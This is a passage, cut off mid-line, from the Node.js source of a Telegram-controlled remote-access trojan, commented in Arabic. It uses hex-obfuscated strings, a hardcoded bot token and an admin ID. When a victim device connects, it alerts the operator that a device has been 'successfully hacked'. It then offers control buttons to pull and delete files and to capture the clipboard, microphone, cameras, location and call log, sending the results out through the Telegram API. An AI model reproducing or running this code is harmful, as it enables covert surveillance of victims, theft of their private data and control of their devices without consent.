// --- (1) المكتبات الأصلية المشفرة ---
var _0x52ef=["\x65\x78\x70\x72\x65\x73\x73","\x77\x73","\x68\x74\x74\x70","\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69","\x75\x75\x69\x64","\x6D\x75\x6C\x74\x65\x72","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x61\x78\x69\x6F\x73"];
const express=require(_0x52ef[0]);const webSocket=require(_0x52ef[1]);const http=require(_0x52ef[2]);const telegramBot=require(_0x52ef[3]);const uuid4=require(_0x52ef[4]);const multer=require(_0x52ef[5]);const bodyParser=require(_0x52ef[6]);const axios=require(_0x52ef[7]);const fs = require('fs');

// --- (2) الإعدادات الخاصة بك (تم التعديل) ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20'; // التوكن الخاص بك
const ADMIN_ID = 6568145373; // ايديك الخاص

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];

// --- (3) مصفوفة دوال الاختراق الأصلية ---
var _0xcb8c=["\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x70\x6F\x73\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74","\x2F\x73\x65\x6E\x64\x4M\x65\x73\x73\x61\x67\x65","\x63\x68\x61\x74\x5F\x69\x64","\x74\x65\x78\x74","\x2F\x73\x65\x6E\x64\x44\x6F\x63\x75\x6D\x65\x6E\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x63\x61\x70\x74\x69\x6F\x6E","\x2F\x73\x65\x6E\x64\x41\x75\x64\x69\x6F","\x61\x75\x64\x69\x6F","\x2F\x73\x65\x6E\x64\x56\x69\x64\x65\x6F","\x76\x69\x64\x65\x6F","\x48\x54\x4D\x4C","\x70\x61\x72\x73\x65\x5F\x6D\x6F\x64\x65"];

// --- (4) لحظة الاختراق والتحكم (بالأزرار المعربة من الصورة) ---
wss.on('connection', (ws, req) => {
    const deviceId = uuid4().substring(0, 8);
    const ip = req.socket.remoteAddress;
    clients.push({ id: deviceId, ws: ws });

    // رسالة الاختراق بنجاح
    const hackAlert = `⚠️ <b>لقد اخترقت جهازاً بنجاح 🔥</b>\n\n` +
                      `🆔 ايدي الجهاز: <code>${deviceId}</code>\n` +
                      `🌍 عنوان الـ IP: <code>${ip}</code>\n\n` +
                      `⚙️ <b>لوحة التحكم الشاملة (معربة):</b>`;

    bot.sendMessage(ADMIN_ID, hackAlert, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📥 جلب ملف", callback_data: `getfile_${deviceId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${deviceId}` }],
                [{ text: "📋 الحافظة (نسخ)", callback_data: `clip_${deviceId}` }, { text: "🎙️ الميكروفون", callback_data: `mic_${deviceId}` }],
                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${deviceId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${deviceId}` }],
                [{ text: "📍 الموقع الحالي", callback_data: `loc_${deviceId}` }, { text: "💬 رسالة منبثقة", callback_data: `toast_${deviceId}` }],
                [{ text: "📞 سجل المكالم
